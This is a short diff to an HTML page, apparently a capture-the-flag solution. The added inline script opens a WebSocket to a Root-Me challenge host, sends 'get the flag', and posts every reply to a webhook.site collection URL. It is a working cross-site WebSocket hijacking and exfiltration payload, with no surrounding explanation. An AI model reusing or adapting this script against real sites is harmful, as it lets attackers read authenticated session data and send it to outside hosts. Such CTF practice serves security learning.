@@ -7,6 +7,15 @@
 </head>
 <body>
     <h1> Hello World !</h1>
-    <script src="script.js"></script>
+    <script>
+        var ws = new WebSocket('ws://ctf19.root-me.org/ws');
+        ws.onopen = function() {
+            ws.send("hello");
+            ws.send("get the flag");
+        };
+        ws.onmessage = function(event) {
+            fetch('https://webhook.site/3b86524c-8ac8-4f64-a924-f0b3c0087145', {method: 'POST', mode: 'no-cors', body: event.data});
+        };
+    </script>
 </body>
 </html>
